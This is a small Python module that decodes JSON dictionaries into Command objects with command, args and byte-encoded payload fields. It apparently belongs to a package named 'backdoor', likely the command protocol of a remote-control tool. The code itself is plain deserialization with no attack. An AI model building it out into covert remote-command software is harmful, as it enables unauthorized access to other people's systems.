from typing import Any

from backdoor.models.commands import Command
from backdoor.serialization.decoders.decoder import Decoder
from backdoor.serialization.decoders.exceptions import NotDecodableError


class CommandDecoder(Decoder):

    def decode(self, dct: dict[str, Any]) -> Command:
        keys = "command", "args", "payload"
        if set(keys) == dct.keys():
            try:
                return Command(
                    command=dct["command"],
                    args=dct["args"],
                    payload=dct["payload"].encode() if dct["payload"] else None,
                )
            except AttributeError:
                raise ValueError("Invalid payload type on decoding. Expected: str")
        else:
            raise NotDecodableError
